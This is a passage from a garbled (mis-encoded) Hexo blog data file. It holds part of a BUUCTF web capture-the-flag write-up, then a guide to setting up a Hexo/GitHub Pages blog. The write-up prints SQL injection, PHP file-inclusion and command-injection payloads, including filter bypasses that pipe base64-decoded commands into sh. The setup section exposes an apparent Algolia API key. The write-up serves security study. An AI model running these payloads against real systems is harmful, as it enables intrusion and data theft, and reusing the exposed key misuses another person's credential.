&#125; $sql = &quot;select &quot;.$post[&#x27;query&#x27;].&quot;||flag from Flag&quot;; mysqli_multi_query($MysqlLink,$sql); do&#123; if($res = mysqli_store_result($MysqlLink))&#123; while($row = mysqli_fetch_row($res))&#123; print_r($row); &#125; &#125; &#125;while(@mysqli_next_result($MysqlLink)); &#125; ?&gt; æœ¬åœ°ç¯å¢ƒæµ‹è¯• 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091mysql&gt; select * from emails;+----+------------------------+| id | email_id |+----+------------------------+| 1 | Dumb@dhakkan.com || 2 | Angel@iloveu.com || 3 | Dummy@dhakkan.local || 4 | secure@dhakkan.local || 5 | stupid@dhakkan.local || 6 | superman@dhakkan.local || 7 | batman@dhakkan.local || 8 | admin@dhakkan.com |+----+------------------------+8 rows in set (0.00 sec)mysql&gt; select 1 from emails;+---+| 1 |+---+| 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 |+---+mysql&gt; select 1,* from emails;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;* from emails&#x27; at line 1mysql&gt; select *,1 from emails;+----+------------------------+---+| id | email_id | 1 |+----+------------------------+---+| 1 | Dumb@dhakkan.com | 1 || 2 | Angel@iloveu.com | 1 || 3 | Dummy@dhakkan.local | 1 || 4 | secure@dhakkan.local | 1 || 5 | stupid@dhakkan.local | 1 || 6 | superman@dhakkan.local | 1 || 7 | batman@dhakkan.local | 1 || 8 | admin@dhakkan.com | 1 |+----+------------------------+---+8 rows in set (0.00 sec)mysql&gt; select *,1|1 from emails;+----+------------------------+-----+| id | email_id | 1|1 |+----+------------------------+-----+| 1 | Dumb@dhakkan.com | 1 || 2 | Angel@iloveu.com | 1 || 3 | Dummy@dhakkan.local | 1 || 4 | secure@dhakkan.local | 1 || 5 | stupid@dhakkan.local | 1 || 6 | superman@dhakkan.local | 1 || 7 | batman@dhakkan.local | 1 || 8 | admin@dhakkan.com | 1 |+----+------------------------+-----+8 rows in set (0.00 sec)mysql&gt; select *,1|email_id from emails;+----+------------------------+------------+| id | email_id | 1|email_id |+----+------------------------+------------+| 1 | Dumb@dhakkan.com | 1 || 2 | Angel@iloveu.com | 1 || 3 | Dummy@dhakkan.local | 1 || 4 | secure@dhakkan.local | 1 || 5 | stupid@dhakkan.local | 1 || 6 | superman@dhakkan.local | 1 || 7 | batman@dhakkan.local | 1 || 8 | admin@dhakkan.com | 1 |+----+------------------------+------------+8 rows in set, 8 warnings (0.00 sec)mysql&gt; select 1||email_id from emails;+-------------+| 1||email_id |+-------------+| 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 |+-------------+8 rows in set (0.00 sec) æ„é€  1*,1 #å³è¯­å¥ä¸º $sql = &quot;select *,1||flag from Flag&quot;; å‚è€ƒé“¾æ¥ å…­ã€[ACTF2020 æ–°ç”Ÿèµ›]Include1è€ƒç‚¹ï¼šæ–‡ä»¶åŒ…å«ã€php ä¼ªåè®® 1?file=php://filter/read=convert.base64-encode/resource=flag.php ç„¶å base64 è§£ç å³å¯ å°è¯• php://input ï¼Œè¢«è¿‡æ»¤ 12345?file=php://input&lt;?phpinclude(&quot;flag.php&quot;);?&gt; ä¸ƒã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File1è€ƒç‚¹ï¼šæ–‡ä»¶åŒ…å«ã€æºç æ³„éœ²ã€php ä¼ªåè®® æŸ¥çœ‹æºä»£ç æˆ–è€…æ˜¯æŠ“åŒ…å¯è·å–åˆ° Archive_room.php æ–‡ä»¶ï¼Œè®¿é—® ç‚¹å‡»æŒ‰é’®å†æŠ“åŒ…ï¼Œå¾—åˆ°ç§å¯†æ–‡ä»¶ secr3t.php è®¿é—®å¾—åˆ° 123456789101112131415&lt;html&gt; &lt;title&gt;secret&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET[&#x27;file&#x27;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); //flagæ”¾åœ¨äº†flag.phpé‡Œ?&gt;&lt;/html&gt; è¿‡æ»¤æ‰äº† tpã€inputã€data ä½¿ç”¨ php:filter// ä¼ªåè®® 1?file=php://filter/read=convert.base64-encode/resource=flag.php æ€»ç»“ï¼š 1234567891011strstr ( string $haystack , mixed $needle , bool $before_needle = false ) : string#è¿”å› haystack å­—ç¬¦ä¸²ä» needle ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®å¼€å§‹åˆ° haystack ç»“å°¾çš„å­—ç¬¦ä¸²ã€‚ #è¯¥å‡½æ•°åŒºåˆ†å¤§å°å†™ã€‚å¦‚æœæƒ³è¦ä¸åŒºåˆ†å¤§å°å†™ï¼Œè¯·ä½¿ç”¨ stristr()ã€‚ stristr() å‡½æ•°æœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€æ¬¡å‡ºç°ã€‚æŸ¥æ‰¾ &quot;world&quot; åœ¨ &quot;Hello world!&quot; ä¸­çš„ç¬¬ä¸€æ¬¡å‡ºç°ï¼Œå¹¶è¿”å›å­—ç¬¦ä¸²çš„å‰©ä½™éƒ¨åˆ†ï¼š&lt;?phpecho stristr(&quot;Hello world!&quot;,&quot;WORLD&quot;);?&gt; #è¿”å›ï¼šworld! å…«ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL1è€ƒç‚¹ï¼šSQL æ³¨å…¥ ä¹‹ è”åˆæŸ¥è¯¢ã€æŠ¥é”™æ³¨å…¥ 123456789101&#x27; and 1=1#-1&#x27; union select 1,2,3#-1&#x27; union select 1,database(),3# #æ•°æ®åº“ geek-1&#x27; union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema = &#x27;geek&#x27;)# #è·å–åˆ°è¡¨ geekuser,l0ve1ysq1-1&#x27; union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema = &#x27;geek&#x27; and table_name = &#x27;l0ve1ysq1&#x27;)# #è·å–åˆ°å­—æ®µ id,username,password-1&#x27; union select 1,database(),(select group_concat(concat_ws(&#x27;~&#x27;,username,password)) from geek.l0ve1ysq1)# #è·å–åˆ° flag ä¹ã€[ACTF2020 æ–°ç”Ÿèµ›]Exec1è€ƒç‚¹ï¼šå‘½ä»¤æ‰§è¡Œã€||ã€|ã€&amp;ã€&amp;&amp; 123|whoami #www-data|pwd #/var/www/html|ls #index.php 1|ls/ #æ ¹ç›®å½•ä¸‹ 1|cat /flag #å¾—åˆ° flag åã€[GXYCTF2019]Ping Ping Ping1è€ƒç‚¹ï¼šå‘½ä»¤æ‰§è¡Œã€ç©ºæ ¼ã€åˆ†éš”ç¬¦ã€å˜é‡è¦†ç›–ã€ 123456|pwd #/var/www/html|ls #flag.php index.php|cat flag.php #fxck your space!|ls / #1fxck your symbol!|cat$IFS$1flag.php #fxck your flag! flagä¹Ÿè¢«è¿‡æ»¤|cat$IFS$1index.php #å†…å®¹å¦‚ä¸‹ 123456789101112131415161718&lt;?phpif(isset($_GET[&#x27;ip&#x27;]))&#123; $ip = $_GET[&#x27;ip&#x27;]; if(preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;1f&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match))&#123; echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match); die(&quot;fxck your symbol!&quot;); &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123; die(&quot;fxck your space!&quot;); &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123; die(&quot;fxck your bash!&quot;); &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123; die(&quot;fxck your flag!&quot;); &#125; $a = shell_exec(&quot;ping -c 4 &quot;.$ip); echo &quot;&lt;pre&gt;&quot;; print_r($a);&#125;?&gt; æ‰¾åˆ°è¿‡è¿‡æ»¤è§„åˆ™ï¼Œæ„é€  123456#å˜é‡è¦†ç›–?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php#å†…è”æ‰§è¡Œ å°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥å»æ‰§è¡Œ?ip=127.0.0.1;cat$IFS$1`ls`;#sh å‘½ä»¤æ‰§è¡Œ?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh æ€»ç»“ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142#ç©ºæ ¼ç»•è¿‡#Linuxä¸‹1. $&#123;IFS&#125;æ›¿æ¢2. $IFS$1æ›¿æ¢3. $&#123;IFSæ›¿æ¢4. %20æ›¿æ¢5. &lt;å’Œ&lt;&gt;é‡å®šå‘ç¬¦æ›¿æ¢6. %09æ›¿æ¢(éœ€è¦phpç¯å¢ƒ)#Windowsä¸‹1. type.\\flag.txt2. type,flag.txt#catç»•è¿‡ å¸¸ä½¿ç”¨ tac(1)more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹(2)less:ä¸ more ç±»ä¼¼ï¼Œä½†æ˜¯æ¯” more æ›´å¥½çš„æ˜¯ï¼Œä»–å¯ä»¥[pg dn][pg up]ç¿»é¡µ(3)head:æŸ¥çœ‹å¤´å‡ è¡Œ(4)tac:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„åå‘æ˜¾ç¤º(5)tail:æŸ¥çœ‹å°¾å‡ è¡Œ(6)nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·(7)od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹(8)vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹(9)vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹(10)sort:å¯ä»¥æŸ¥çœ‹(11)uniq:å¯ä»¥æŸ¥çœ‹(12)file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹(13)sed:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹(14)grep1ã€åœ¨å½“å‰ç›®å½•ä¸­ï¼ŒæŸ¥æ‰¾åç¼€æœ‰ file å­—æ ·çš„æ–‡ä»¶ä¸­åŒ…å« test å­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼Œå¹¶æ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²çš„è¡Œã€‚æ­¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š grep test *file (15)strings#å˜é‡ç»•è¿‡a=c;b=at;c=fl;d=ag;$a$b $c$d#base64 ç¼–ç ç»•è¿‡echo &#x27;cat&#x27; | base64echo &#x27;Y2F0Cg==&#x27; | base64 -d test.txt#å†…è”æ‰§è¡Œ å°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥å»æ‰§è¡Œ#bashã€shå‘½ä»¤ # Y2F0IGZsYWcucGhw å†…å®¹æ˜¯ cat flag.phpecho$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bashecho$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh","categories":[{"name":"BUUCTF","slug":"BUUCTF","permalink":"https://xizhi-future.github.io/categories/BUUCTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://xizhi-future.github.io/tags/Web/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"https://xizhi-future.github.io/tags/BUUCTF/"}],"author":"xizhi-future"},{"title":"ä¸ªäººåšå®¢éƒ¨ç½²","slug":"ä¸ªäººåšå®¢éƒ¨ç½²","date":"2021-05-25T09:17:20.000Z","updated":"2021-07-09T11:08:08.918Z","comments":true,"path":"2021/05/25/ä¸ªäººåšå®¢éƒ¨ç½²/","link":"","permalink":"https://xizhi-future.github.io/2021/05/25/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E9%83%A8%E7%BD%B2/","excerpt":"ä¸€ã€ä¸ªäººåšå®¢æ­å»º ç”¨Gridea+GitHub pagesæˆ–Hexo+GitHub pagesç”¨åˆ°çš„ Gitè½¯ä»¶ æœ‰ä»€ä¹ˆç”¨ï¼Ÿç­”ï¼šGitè½¯ä»¶æ˜¯ä¸€ä¸ªç”¨æ¥ä¸Šä¼  æœ¬åœ°æ–‡ä»¶ åˆ°GitHubä¸Šçš„å·¥å…·ã€‚ç”¨Gitä¸Šä¼ æœ¬åœ°æ–‡ä»¶åˆ°GitHubåï¼ŒGitHubçš„GitHub pagesï¼ˆé™æ€ç«™ç‚¹æ‰˜ç®¡æœåŠ¡ï¼‰ä¼šå»ºç«‹ä¸€ä¸ªå¯è®¿é—®çš„ç«™ç‚¹å¹¶å¸®ä½ ç®¡ç†è¿™äº›æ–‡ä»¶ï¼Œç„¶åä½ å°±å¯ä»¥é€šè¿‡ä½ åœ¨GitHubä¸Šè®¾ç½®çš„çš„åŸŸåæ¥è®¿é—®è¿™ä¸ªç«™ç‚¹ã€‚","text":"ä¸€ã€ä¸ªäººåšå®¢æ­å»º ç”¨Gridea+GitHub pagesæˆ–Hexo+GitHub pagesç”¨åˆ°çš„ Gitè½¯ä»¶ æœ‰ä»€ä¹ˆç”¨ï¼Ÿç­”ï¼šGitè½¯ä»¶æ˜¯ä¸€ä¸ªç”¨æ¥ä¸Šä¼  æœ¬åœ°æ–‡ä»¶ åˆ°GitHubä¸Šçš„å·¥å…·ã€‚ç”¨Gitä¸Šä¼ æœ¬åœ°æ–‡ä»¶åˆ°GitHubåï¼ŒGitHubçš„GitHub pagesï¼ˆé™æ€ç«™ç‚¹æ‰˜ç®¡æœåŠ¡ï¼‰ä¼šå»ºç«‹ä¸€ä¸ªå¯è®¿é—®çš„ç«™ç‚¹å¹¶å¸®ä½ ç®¡ç†è¿™äº›æ–‡ä»¶ï¼Œç„¶åä½ å°±å¯ä»¥é€šè¿‡ä½ åœ¨GitHubä¸Šè®¾ç½®çš„çš„åŸŸåæ¥è®¿é—®è¿™ä¸ªç«™ç‚¹ã€‚ Github Pagesæ˜¯é¢å‘ç”¨æˆ·ã€ç»„ç»‡å’Œé¡¹ç›®å¼€æ”¾çš„å…¬å…±é™æ€é¡µé¢æ­å»ºæ‰˜ç®¡æœåŠ¡ï¼Œç«™ç‚¹å¯ä»¥è¢«å…è´¹æ‰˜ç®¡åœ¨Githubä¸Šï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©ä½¿ç”¨ Github Pages é»˜è®¤æä¾›çš„åŸŸågithub.io æˆ–è€… è‡ªå®šä¹‰åŸŸå æ¥å‘å¸ƒç«™ç‚¹ã€‚Github Pages æ”¯æŒè‡ªåŠ¨åˆ©ç”¨ ã€Jekyll ç”Ÿæˆç«™ç‚¹ï¼Œä¹ŸåŒæ ·æ”¯æŒçº¯ HTML æ–‡æ¡£ï¼Œå°†ä½ çš„ Hexoç«™ç‚¹æ‰˜ç®¡åœ¨ Github Pages ä¸Šæ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©ã€‚ åˆ©ç”¨Hexoå’ŒGithubPages/CodingPagesæ­å»ºåšå®¢ï¼Œå®é™…ä¸Šå°±æ˜¯åˆ©ç”¨Hexoåœ¨æœ¬åœ°ï¼ˆä½ çš„ç”µè„‘ä¸Šï¼‰ç”Ÿæˆä¸€ä¸ªåšå®¢ç«™ç‚¹ï¼Œç„¶åæŠŠæœ¬åœ°åšå®¢ç«™ç‚¹å†…å®¹ä¼ è¾“åˆ°Github/Codingä¸Šè¿›è¡Œæ‹·è´å’Œå¤‡ä»½ã€‚å†ç”±Githubå’ŒCodingæä¾›çš„GithubPages/CodingPagesæœåŠ¡å°†åšå®¢éƒ¨ç½²åˆ°ç½‘ä¸Šï¼Œè¿™æ ·ä½ çš„åšå®¢å°±å¯ä»¥ä½œä¸ºä¸€ä¸ªç‹¬ç«‹çš„ç«™ç‚¹è¢«åˆ«äººæµè§ˆï¼ˆæ­£å¼ä¸Šçº¿ï¼‰ã€‚åŒæ—¶ä½ ä¹Ÿå¯ä»¥åœ¨Githubå’ŒCodingä¸Šç®¡ç†ä½ çš„åšå®¢ã€‚ 1.1 å®‰è£… nodejsnodejs å®˜ç½‘ 12345node -vnmp -vnpm root -gåˆ›å»º node_cache å’Œ node_global ä¸¤ä¸ªæ–‡ä»¶å¤¹npm config set cache &quot;D:\\ç½‘å®‰å®éªŒå®¤\\environment\\nodejs\\node_global&quot; å‚è€ƒ 1.2 æ³¨å†Œ githubgithub å®˜ç½‘ 1.3 ä¸‹è½½ git for wingit for win 1.4 Git SSH é…ç½®123åœ¨ gitfoewin å®‰è£…è·¯å¾„ä¸‹æ‰“å¼€ git-bash.exegit config --global user.name &quot;yourname&quot; #Githubç”¨æˆ·ågit config --global user.email &quot;youremail&quot; #Githubé‚®ç®± 123æ£€æŸ¥git config user.namegit config user.email 1è¾“å…¥å‘½ä»¤ï¼šssh-keygen -t rsa -C &quot;youremail&quot; å°†ä¼šç”Ÿæˆä¸€ä¸ª.sshæ–‡ä»¶å¤¹ï¼Œæ‰¾åˆ°å®ƒ å°† id_rsa.pub ä¸­åœ°å†…å®¹å¤åˆ¶ä¸‹æ¥ ç„¶åè¿›å…¥ä½ çš„githubè¿›è¡Œ SSH and GPG keys é…ç½®ï¼Œæ‰¾åˆ°SSH keysçš„è®¾ç½®é€‰é¡¹ï¼Œç‚¹å‡»New SSH keyï¼ŒæŠŠçš„id_rsa.pubé‡Œé¢çš„ä¿¡æ¯ç²˜è´´è¿›å» æµ‹è¯•æ˜¯å¦é…ç½®æˆåŠŸ 1è¾“å…¥ ssh -T git@github.com 1.5 HEXO æ¡†æ¶ä¸‹è½½HEXO å®˜ç½‘ 1234npm install hexo-cli -ghexo init xi-zhiBlog #åˆå§‹åŒ–cd xi-zhiBlognpm install å®‰è£…ä¾èµ– 12æœ¬åœ°è¿è¡Œ hexo s -p 3333è®¿é—® http://localhost:3333/ æˆ–è€…æ˜¯ 123hexo så‡ºç°é»˜è®¤çš„ç«¯å£ è®¿é—®å³å¯å‡ºç°ä»¥ä¸‹ hexo é¡µé¢ 1.6 æ–°å»ºæ–‡ç« æµ‹è¯•1hexo new &quot;æˆ‘çš„first blog&quot; ç¼–å†™åšå®¢æ–‡æ¡£ æ¸…ç† ç”Ÿæˆ 12hexo cleanhexo g 1.7 å°†åšå®¢æ¨é€åˆ° github ä¸Š ç™»å½•å·²ç»æ³¨å†Œå¥½çš„ Github ï¼Œåˆ›å»ºæ–°çš„ä»“åº“ï¼Œåç§°å¿…é¡»æ˜¯ username.github.io å®‰è£… git æ’ä»¶ 1npm install hexo-deployer-git --save ä¿®æ”¹åšå®¢é…ç½®æ–‡ä»¶ æ¨é€åšå®¢ 123hexo clean #æ¸…ç†hexo generate #ç”Ÿæˆhexo deploy #éƒ¨ç½² ç­‰å¾…ä¸€ä¼šï¼ˆæˆ–è®¸ä¼šæœ‰äº›é•¿ã€‚ã€‚ã€‚ï¼‰ è®¿é—® https://username.github.io ï¼Œå¾—åˆ° 1.8 å®‰è£… sublimesublime å®˜ç½‘ äºŒã€ä¸»é¢˜ç¤ºä¾‹ï¼šyilia 1git clone https://github.com/litten/hexo-theme-yilia.git themes/yilia 123hexo cleanhexo ghexo s 2.1 Fan2.1.1 ä¸»é¢˜ä¸‹è½½ä¸‹è½½ä¸»é¢˜æ¨¡å— 1git clone https://github.com/fan-lv/Fan.git themes/Fan æ›´æ”¹ä¸»é¢˜é…ç½® 1234# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: Fan å®‰è£…ä¾èµ–åŒ… 1npm install --save hexo-renderer-jade hexo-renderer-stylus æ³¨æ„ ä¸Šé¢ä¿®æ”¹çš„æ˜¯ themes\\Fan\\_config.yml è·¯å¾„ä¸‹çš„ï¼Œè€Œé æ ¹ç›®å½•ä¸‹çš„ _config.yml ï¼Œä¿®æ”¹å®Œä¹‹åä¹Ÿè®¸è¿˜ä¼šæœ‰ å…³äº è¯„è®ºçš„ æŠ¥é”™ï¼Œå› ä¸ºè¿™æ—¶æˆ‘ä»¬è¿˜æœªé…ç½®ç•™è¨€è¯„è®ºç›¸å…³çš„é…ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†å…¶é…ç½®ä¸ºç©ºå°±å¯ä»¥äº†ã€‚ 123hexo cleanhexo ghexo d å¾—åˆ° 2.1.2 åˆ›å»ºæ–°çš„åšå®¢1hexo new &quot;Lihux å‘½ä»¤&quot; é»˜è®¤å†…å®¹å¦‚ä¸‹ æˆ‘ä»¬å¯ä»¥è‡ªå·±é…ç½® 12345678title: xxxauthor: xxxtags: - xxxcategories: - xxxdate: xxxtop: 1 #è¡¨ç¤ºéœ€è¦ç½®é¡¶çš„æ–‡ç« ï¼Œæ•°å€¼è¶Šå¤§è¶Šé å‰ 2.1.3 è¯„è®ºä¸ç•™è¨€ åœ¨æ ¹ç›®å½•ä¸‹ _config.yml æ–‡ä»¶ä¸­åŠ å…¥ä»¥ä¸‹ä»£ç ï¼Œ[&quot;gitment&quot;, &quot;valine&quot;] é…ç½®è‡ªè¡Œé€‰æ‹©ä¸€ä¸ª 1234567891011121314comments: gitment: enable: true owner: &#x27;Your GitHub ID&#x27; repo: &#x27;The repository to store your comments. Make sure you&#x27;re repo&#x27;s owner&#x27; client_id: &#x27;GitHub client ID&#x27; client_secret: &#x27;GitHub client secret&#x27; # å¯ä»¥è‡ªç”±é…ç½® valine çš„å…¶ä»–é…ç½®é¡¹ valine: appId: &#x27;Your appId&#x27; appKey: &#x27;Your appKey&#x27; placeholder: &#x27;xxx&#x27; ...(valineé…ç½®é¡¹ï¼Œå‚è€ƒé“¾æ¥ https://valine.js.org/configuration.html) themes -&gt; _config.yml ä¸­å¯ä»¥å¼€å¯æˆ–å…³é—­ commentsï¼Œå¹¶ä¸”é€šè¿‡ type æŒ‡å®šä½¿ç”¨çš„è¯„è®ºæ’ä»¶ 12345# è¯„è®ºcomments: enable: true # ä½¿ç”¨å“ªç§è¯„è®ºæ’ä»¶[&quot;gitment&quot;, &quot;valine&quot;] type: &quot;valine&quot; 2.1.4 å¢åŠ  algolia æœç´¢åŠŸèƒ½æ³¨å†Œalgolia æ–°å¢api keysï¼Œé‡è¦çš„æ˜¯åœ¨ACLé‡Œé¢å¢åŠ åˆ é™¤å’Œæ–°å¢Objectçš„æƒé™ å¦‚å›¾å¾—åˆ° å®‰è£…æ‰©å±• 1npm install hexo-algolia --save å¢åŠ æ ¹ç›®å½• _config.yml é…ç½® 1234algolia: applicationID: &#x27;ä½ çš„Application ID&#x27; apiKey: &#x27;ä½ çš„Search-Only API Key&#x27; indexName: &#x27;è¾“å…¥åˆšæ‰åˆ›å»ºindex name&#x27; æ‰§è¡Œ 123set HEXO_ALGOLIA_INDEXING_KEY=33ee877688fc550930bcca909f161863#Notes: Mac å’Œ git bash ä¸º export, Windows ä¸º set, Powershell ç”¨ $envhexo algolia å‘ç°å·²ç»æäº¤ ç„¶åä¿®æ”¹ä¸»é¢˜ä¸‹çš„é…ç½®ã€‚æ›´æ”¹ä¸ºtrue æœ€å 123hexo cleanhexo ghexo d 2.2 Nextæä¾›å†™çš„å¾ˆå¥½çš„å‚è€ƒåšå®¢ https://blog.csdn.net/loze/article/details/94206726 http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html https://so.csdn.net/so/search?q=hexo%20next%20%E9%9F%B3%E4%B9%90&amp;t=&amp;u=&amp;fri= 2.3 Hikerä¸‹è½½æºç  1git clone https://github.com/iTimeTraveler/hexo-theme-hiker.git themes/hiker ä¿®æ”¹é…ç½®æ–‡ä»¶å½“ä¸­çš„ theme æ›´æ–° 12cd themes/hikergit pull æœç´¢åŠŸèƒ½ https://blog.csdn.net/nineya_com/article/details/103338696 ä¸‰ã€å…¶å®ƒä»‹ç»3.1 åˆ›å»ºåšå®¢123456hexo new [layout] &lt;title&gt; #åšå®¢çš„åˆ›å»ºï¼Œ[layout] å†³å®šåšå®¢è·¯å¾„çš„ä¸åŒhexo new paper #source/_postshexo new page board #sourceï¼Œè®¿é—®é“¾æ¥å˜ä¸º https://xxx.xxx/boardhexo new draft newpage #source/_draftshexo server --draft #å°† draft åœ¨æœ¬åœ°é¢„è§ˆhexo publish draft newpage #å°† draft å‘è¡¨åˆ° post ä¸­ 3.2 èœå•æ 1234567891011121314151617181920212223242526272829#å…¶ä¸­ï¼ŒAboutè¿™ä¸ªä½ æ˜¯æ‰¾ä¸åˆ°ç½‘é¡µçš„ï¼Œå› ä¸ºä½ çš„æ–‡ç« ä¸­æ²¡æœ‰aboutè¿™ä¸ªä¸œè¥¿ã€‚å¦‚æœä½ æƒ³è¦çš„è¯ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤hexo new page about#å®ƒå°±ä¼šåœ¨æ ¹ç›®å½•ä¸‹sourceæ–‡ä»¶å¤¹ä¸­æ–°å»ºäº†ä¸€ä¸ªaboutæ–‡ä»¶å¤¹ï¼Œä»¥åŠindex.mdï¼Œåœ¨index.mdä¸­å†™ä¸Šä½ æƒ³è¦å†™çš„ä¸œè¥¿ï¼Œå°±å¯ä»¥åœ¨ç½‘ç«™ä¸Šå±•ç¤ºå‡ºæ¥äº†ã€‚#æƒ³è¦è‡ªå·±å†è‡ªå®šä¹‰ä¸€ä¸ªèœå•æ çš„é€‰é¡¹hexo new page yourdiy#ç„¶ååœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶çš„menuèœå•æ æ·»åŠ ä¸€ä¸ª Yourdiy : /yourdiyï¼Œæ³¨æ„å†’å·åé¢è¦æœ‰ç©ºæ ¼ï¼Œä»¥åŠå‰é¢çš„ç©ºæ ¼è¦å’Œmenuä¸­é»˜è®¤çš„ä¿æŒæ•´é½ã€‚ç„¶ååœ¨languagesæ–‡ä»¶å¤¹ä¸­ï¼Œæ‰¾åˆ°zh-CN.ymlï¼Œåœ¨indexä¸­æ·»åŠ yourdiy: &#x27;ä¸­æ–‡æ„æ€&#x27;å°±å¯ä»¥æ˜¾ç¤ºä¸­æ–‡äº†ã€‚#åˆ†ç±»ï¼šhexo new page categories#è¿›å…¥source\\categoriesä¸­ï¼Œä¿®æ”¹index.md---title: åˆ†ç±»date: 2021-05-24 00:03:00type: categories---#ä¹‹ååˆ›å»ºæ–°çš„åšå®¢æ–‡ç« æ—¶åœ¨å…¶æœ€ä¸Šé¢æ·»åŠ  categories: åç§° å³å¯#æ ‡ç­¾ï¼šhexo new page tags#è¿›å…¥source\\categoriesä¸­ï¼Œä¿®æ”¹index.md---title: æ ‡ç­¾date: 2019-07-14 18:19:31type: &quot;tags&quot;---#ä¹‹ååˆ›å»ºæ–°çš„åšå®¢æ–‡ç« æ—¶åœ¨å…¶æœ€ä¸Šé¢æ·»åŠ  tags: -åç§° å³å¯ 3.3 è¯„è®ºä¸»é¢˜é…ç½®ä¸­ä¿®æ”¹ï¼štype ç±»å‹ 12345# è¯„è®ºcomments: enable: true # ä½¿ç”¨å“ªç§è¯„è®ºæ’ä»¶[&quot;gitment&quot;, &quot;valine&quot;] type: gitment ï¼šæ ¹ç›®å½•é…ç½®æ–‡ä»¶ä¸­å¢åŠ  gitment æ³¨å†Œé¡µé¢ 123456789101112comments: gitment: enable: true mint: true count: true lazy: true cleanly: true language: github_user: github_repo: client_id: client_serect: valineï¼šæ ¹ç›®å½•é…ç½®æ–‡ä»¶ä¸­å¢åŠ  valine æ³¨å†Œé¡µé¢ 12345678910comments: valine: enable: true appid: appkey: notify: false verity: false placeholder: ç•™ä¸‹ä½ ç¾å¥½çš„è¶³è¿¹å­^-^! guest_info: nink,mail pageSize: 10 3.4 å›¾åºŠ è…¾è®¯äº‘æ³¨å†Œã€åˆ›å»ºå¯¹è±¡å­˜å‚¨ å‚è€ƒé“¾æ¥ è·å–å¯†é’¥ åœ°å€ COSBrowser å®˜æ–¹æ–‡æ¡£ ä¸‹è½½ PicGo ä¸‹è½½åœ°å€ ä½¿ç”¨ è…¾è®¯äº‘ + Typora + PicGo : æ–‡ä»¶â€” åå¥½è®¾ç½®ï¼Œå¦‚ä¸‹å›¾è¿›è¡Œé…ç½® å¯¹äº PicGo ï¼Œé…ç½®å¦‚ä¸‹ æœ€åç‚¹å‡»ä¸Šæ–¹çš„éªŒè¯å›¾ç‰‡ä¸Šä¼ é€‰é¡¹å³å¯æ£€éªŒ ç¬¬äºŒç§é…ç½® ç‚¹å‡»ä¸‹è½½æˆ–æ›´æ–° è®¿é—®ä¸‹é¢é“¾æ¥ï¼Œæ³¨å†Œè´¦å· 1https://sm.ms/home/apitoken 